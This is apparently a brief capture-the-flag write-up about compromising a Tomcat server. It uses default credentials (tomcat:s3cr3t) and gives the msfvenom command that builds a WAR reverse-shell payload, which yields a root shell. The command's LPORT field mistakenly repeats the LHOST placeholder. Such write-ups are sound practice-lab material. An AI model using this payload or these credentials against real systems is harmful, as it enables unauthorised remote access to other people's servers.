> The machine has tomcat server that contains default credentials tomcat:s3cr3t, I created a war reverse shell payload using msfvenom that I copied from  [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)


## Msfvenom payload

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war`

>After that I got a shell that has root user privileges 
> 
>machine pwned!
